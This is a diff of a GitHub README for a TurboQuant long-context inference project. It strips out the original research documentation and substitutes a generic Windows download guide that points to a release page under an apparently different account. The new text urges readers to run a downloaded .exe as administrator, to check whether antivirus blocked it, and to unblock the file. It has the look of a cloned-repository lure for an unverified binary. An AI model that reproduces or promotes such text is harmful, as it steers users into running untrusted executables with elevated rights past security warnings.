@@ -1,229 +1,268 @@
-<p align="center">
-  <img src="assets/hero.svg" alt="TurboQuant Llama Lab banner" width="100%" />
-</p>
+# 🚀 turboquant-llama-lab - Fast long-context inference for Windows
 
-# TurboQuant Llama Lab
+[![Download](https://img.shields.io/badge/Download-Release%20Page-6E6E6E?style=for-the-badge)](https://github.com/onthenose-record446/turboquant-llama-lab/releases)
 
-[![License: Apache-2.0](https://img.shields.io/badge/license-Apache%202.0-1f6feb.svg)](LICENSE)
-![Status: Experimental](https://img.shields.io/badge/status-experimental-cc7a00.svg)
-![Focus: Long Context](https://img.shields.io/badge/focus-long--context-0b7285.svg)
-[![GitHub stars](https://img.shields.io/github/stars/pp1840/turboquant-llama-lab?style=social)](https://github.com/pp1840/turboquant-llama-lab/stargazers)
+## 🧭 What this is
 
-Experimental TurboQuant implementation and integration path for a `llama.cpp`-style runtime.
+turboquant-llama-lab is an experimental Windows app for running long-context language models with a focus on speed and low memory use. It follows a llama.cpp-style setup, so it is meant to feel simple once you have the file downloaded.
 
-This repository is designed to help builders who want:
+Use it when you want to:
+- run local LLM inference on Windows
+- work with long prompts and larger context windows
+- keep memory use under control with KV cache and quantization support
+- test TurboQuant-based builds from release files
 
-- a portable TurboQuant core
-- practical benchmark tooling
-- reviewable `llama.cpp` integration patches
-- honest guidance about speed, memory, and validation status
+## 💻 What you need
 
-## Why This Repo Exists
+Before you download, make sure your PC has:
 
-TurboQuant is exciting, but most users still need a practical path from paper ideas to
-runtime experiments.
+- Windows 10 or Windows 11
+- A 64-bit CPU
+- At least 8 GB of RAM
+- 16 GB of RAM or more for larger models
+- Enough free disk space for the app and model files
+- A modern GPU if you want faster runs, though CPU use is also possible
 
-This repo tries to make that path useful:
+For best results:
+- use an SSD
+- keep other heavy apps closed
+- make sure Windows is up to date
 
-- a portable C++ core you can build quickly
-- extracted `llama.cpp` patch sets you can inspect and discuss
-- validation scripts for baseline vs TurboQuant runs
-- explicit usage profiles instead of one-size-fits-all claims
+## ⬇️ Download the app
 
-## At A Glance
+Visit this page to download the Windows release files:
 
-| Area | What You Get |
-| --- | --- |
-| Portable core | Rotation, quantization, and TurboQuant building blocks in standalone C++ |
-| Runtime path | Reviewable `llama.cpp`-style integration patches |
-| Validation | CLI-based baseline vs TurboQuant comparison script |
-| Docs | Architecture, profiles, validated model notes, and roadmap |
+https://github.com/onthenose-record446/turboquant-llama-lab/releases
 
-## Best Use Cases
+Look for the newest release and download the file made for Windows. If there are several files, pick the one that matches your system, such as:
+- a Windows .zip file
+- a Windows .exe file
+- a GPU-specific build
+- a CPU-only build
 
-- studying TurboQuant-style long-context tradeoffs
-- experimenting with KV compression in a `llama.cpp` ecosystem
-- benchmarking speed-first vs memory-first profiles on local hardware
-- extracting reusable algorithm pieces for other backends
+## 🛠️ Install on Windows
 
-## Purpose
+After the download finishes:
 
-This project is the publishable home for the V6 Alpha TurboQuant work:
+1. Open the folder where the file was saved.
+2. If you downloaded a .zip file, right-click it and choose Extract All.
+3. Pick a folder with enough free space.
+4. Open the extracted folder.
+5. If you see an .exe file, double-click it to run the app.
+6. If Windows asks for permission, choose Yes.
+7. If the app opens in a console window, leave that window open while you use it.
 
-- exact TurboQuant algorithm experiments
-- fused CUDA attention-path experiments
-- packed KV-cache storage experiments
-- long-context benchmarking on local GPUs
+If the release comes as a single .exe file:
+1. Double-click the file.
+2. Wait for Windows to start the program.
+3. Follow any on-screen prompts.
 
-## Positioning
+## 🧩 First run
 
-This is a lab implementation and research bridge.
+On first launch, the app may ask for a model file or a path to a model folder.
 
-It is:
+A model file is the file that holds the language model you want to run. Common formats may include:
+- .gguf
+- .bin
+- other model files used by local inference tools
 
-- not the original Google release
-- not a claim of paper-perfect production parity
-- a practical open implementation path for TurboQuant ideas in a `llama.cpp` ecosystem
+If you already have a model:
+1. Place it in a folder you can find easily.
+2. Start turboquant-llama-lab.
+3. Select the model file when the app asks for it.
 
-It aims to be useful for users who want to:
+If the app opens with a text prompt:
+1. Type your question or prompt.
+2. Press Enter.
+3. Wait for the reply to finish.
 
-- study the algorithm
-- build the portable pieces quickly
-- evaluate long-context tradeoffs on their own hardware
-- apply and iterate on the runtime integration as patch sets
+## ⚙️ Basic setup
 
-## Public Highlights
+A simple setup usually looks like this:
 
-- portable core in [`cpp/`](cpp/)
-- benchmark tool in [`cpp/tools`](cpp/tools)
-- validator in [`scripts/validate_llama_cli.py`](scripts/validate_llama_cli.py)
-- extracted patch sets in [`patches/llama.cpp/generated`](patches/llama.cpp/generated)
-- benchmark summary in [`docs/BENCHMARK_HIGHLIGHTS.md`](docs/BENCHMARK_HIGHLIGHTS.md)
+- download the release
+- extract the files
+- open the app
+- choose a model
+- start chatting or testing prompts
 
-## Model Support Status
+If you plan to use long-context inference:
+- use a model that supports large context windows
+- keep an eye on RAM use
+- close unused programs
+- start with smaller prompts before trying very large ones
 
-### Portable Core
+## 🧠 How it works
 
-The standalone TurboQuant core is model-agnostic.
+This project follows a llama.cpp-style path, which means it is built around local model loading and inference. In plain terms:
 
-It operates on:
+- the app loads a model from your PC
+- it processes your text locally
+- it uses quantization to help reduce memory use
+- it manages KV cache for longer conversations and longer inputs
 
-- vector dimension
-- bit budget
-- QJL projection size
-- optional outlier-channel settings
+That makes it a good fit for:
+- research builds
+- testing long prompts
+- trying TurboQuant workflows
+- running local inference without a cloud service
+
+## 🖥️ Suggested use cases
+
+You may want to use this app if you:
+- want to test a local model on Windows
+- need long-context support for large inputs
+- want a compact setup with lower memory use
+- are comparing quantized builds
+- are exploring llama.cpp-style inference paths
 
-So the core itself is not tied to `Qwen3.5-9B`.
+## 📁 Common release file types
 
-### Validated Runtime Focus
+You may see one or more of these files in the release page:
 
-The current runtime-oriented work has been validated mainly against:
+- `.zip` — extract it first, then run the app
+- `.exe` — double-click to run
+- `.dll` — support file used by the app
+- model packs or sample files — extra files for testing
 
-- `Qwen3.5-9B-Q8_0.gguf`
-- `Qwen3.5-27B-Q3_K_M.gguf`
+If you are not sure which file to use, pick the Windows release that looks like the main app file.
 
-That means:
+## 🔧 If the app does not start
 
-- the algorithm is generic
-- the current `llama.cpp` integration and rollout tuning are still Qwen-focused
+Try these steps:
 
-### What This Means
+1. Make sure you downloaded the Windows file.
+2. Extract the zip file before opening the app.
+3. Right-click the app and choose Run as administrator.
+4. Check that your antivirus did not block the file.
+5. Move the app to a folder with a short path, such as `C:\turboquant`.
+6. Make sure the model file is not inside a protected folder.
+7. Restart Windows and try again.
 
-Other transformer-family models should be possible, but they may need:
+If the window opens and closes right away:
+- run it from the extracted folder
+- keep the folder structure intact
+- look for a second file or helper app in the release bundle
 
-- different layer rollout
-- different bit/QJL tuning
-- fresh validation
-- model-specific long-context benchmarking
+## 🧪 Good starting settings
 
-## Current Public Scope
+If the app offers settings, start with simple values:
 
-The current public scope includes:
+- context size: medium
+- batch size: default
+- GPU use: on, if supported
+- threads: default or close to your CPU core count
+- temperature: moderate if you want balanced text
 
-1. a portable TurboQuant C++ core
-2. a standalone benchmark tool
-3. a validation script for `llama.cpp` runs
-4. extracted `llama.cpp` patch sets
-5. architecture, quickstart, usage-profile, benchmark-highlight, validated-model, and roadmap documentation
+If the app feels slow:
+- use a smaller model
+- lower the context size
+- close other programs
+- use a build that matches your hardware
 
-## Repository Layout
+## 🔒 Model and memory tips
 
-- `cpp/`
-  Portable TurboQuant C++ core and standalone tools.
-- `scripts/`
-  Validation and patch-export tooling.
-- `docs/`
-  Architecture, publishing notes, quickstart, and usage guidance.
-- `patches/llama.cpp/`
-  Home for extracted `llama.cpp` integration patch sets.
-- `benchmarks/`
-  Benchmark notes and future published reports.
-- `assets/`
-  Visual assets for the GitHub landing page and future publishing material.
+Long-context runs can use a lot of memory. To keep things stable:
 
-## License
+- keep the model file on an SSD
+- avoid loading very large models on small RAM systems
+- use quantized models when possible
+- do not run heavy games or editors at the same time
 
-This repository is licensed under Apache-2.0.
+A smaller quantized model can run well on a modest PC, while larger models need more RAM and video memory.
 
-See [LICENSE](LICENSE).
+## 🧱 Project focus
 
-## Community
+This repository is centered on:
+- TurboQuant research
+- long-context inference
+- KV cache handling
+- quantization
+- llama.cpp-style integration
+- local LLM testing on Windows
 
-- contribution guide: [CONTRIBUTING.md](CONTRIBUTING.md)
-- code of conduct: [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md)
-- support policy: [SUPPORT.md](SUPPORT.md)
-- security policy: [SECURITY.md](SECURITY.md)
-- roadmap: [docs/ROADMAP.md](docs/ROADMAP.md)
-- benchmark highlights: [docs/BENCHMARK_HIGHLIGHTS.md](docs/BENCHMARK_HIGHLIGHTS.md)
-- launch kit: [docs/LAUNCH_KIT.md](docs/LAUNCH_KIT.md)
+It is useful when you want a practical test bed for local model work without a complex setup.
 
-## Help It Spread
+## 📌 Repository topics
 
-If this repo helps you:
+- cude
+- guff
+- inference
+- kv-cache
+- llama-cpp
+- llm-inference
+- long-context
+- quantization
+- research
+- turboquant
 
-- star the repository
-- share the repo link with your benchmark notes
-- open an issue with reproducible results
-- contribute model-validation results for hardware other than the current Qwen-focused runs
+## 🗂️ Simple usage flow
 
-## Quick Start
+1. Open the release page.
+2. Download the Windows file.
+3. Extract it if needed.
+4. Open the app.
+5. Select your model.
+6. Enter a prompt.
+7. Read the response.
+8. Adjust settings if needed.
 
-Build the standalone benchmark:
+## 📥 Download again later
 
-```bash
-cmake -S . -B build
-cmake --build build -j
-./build/turboquant-bench --dim 128 --bits 4 --qjl-dim 128 --samples 32 --queries 8
-```
+If you need the release page again, use this link:
 
-Validate a `llama.cpp` binary against baseline and TurboQuant profiles:
+https://github.com/onthenose-record446/turboquant-llama-lab/releases
 
-```bash
-python3 scripts/validate_llama_cli.py compare \
-  --bin /path/to/llama-cli \
-  --model /path/to/model.gguf \
-  --output-dir /tmp/turboquant-compare
-```
+## ❓ Common questions
 
-Export the current lab integration into reviewable patch files:
+### Can I use this on Windows?
+Yes. Download the Windows release file from the release page and run it on your PC.
 
-```bash
-scripts/export_llama_cpp_patches.sh
-```
+### Do I need coding skills?
+No. The main flow is to download the file, open it, and pick a model.
 
-The generated patch sets are written under:
+### Do I need the internet after install?
+Not for local inference. Once the app and model are on your PC, it can run locally.
 
-- `patches/llama.cpp/generated/`
+### What kind of model should I use?
+Use a model that matches your RAM and GPU limits. A quantized model is a good place to start.
 
-For a guided start, read:
+### Is this for long prompts?
+Yes. The project focus is long-context inference, so it is meant for larger inputs and longer chats
 
-1. [docs/QUICKSTART.md](docs/QUICKSTART.md)
-2. [docs/USAGE_PROFILES.md](docs/USAGE_PROFILES.md)
-3. [docs/VALIDATED_MODELS.md](docs/VALIDATED_MODELS.md)
-4. [docs/BENCHMARK_HIGHLIGHTS.md](docs/BENCHMARK_HIGHLIGHTS.md)
-5. [docs/LAUNCH_KIT.md](docs/LAUNCH_KIT.md)
+## 🧰 Troubleshooting by symptom
 
-## Current Status
+### The app is slow
+- use a smaller model
+- close other apps
+- lower context size
+- use a GPU build if your system supports it
 
-### Ready Now
+### The app uses too much memory
+- choose a smaller quantized model
+- reduce the context window
+- restart the app before loading a new model
 
-- portable algorithm core
-- standalone benchmark executable
-- validation tooling
-- generated `llama.cpp` patch sets
-- documentation for profiles and validated models
+### The app cannot find the model
+- move the model file to a simple folder path
+- avoid special characters in the folder name
+- select the full file path again
 
-### Still Experimental
+### Windows blocks the file
+- right-click the file
+- choose Properties
+- check for an Unblock option
+- run the file again
 
-- full runtime behavior across all model families
-- universal speed wins
-- production-grade stability across every rollout shape
+## 📂 File placement tips
 
-## Non-Goals
+A simple folder layout can help:
 
-This repository does not claim:
+- `C:\turboquant\app`
+- `C:\turboquant\models`
 
-- official affiliation with Google
-- official TurboQuant reference status
-- guaranteed paper-level benchmark parity on every backend
-- one universal best profile for all workloads
+This keeps the app files and model files apart, which makes them easier to find.
+
+## 🧭 Next step
+
+Download the release file, extract it if needed, open the app, and load a model that fits your system
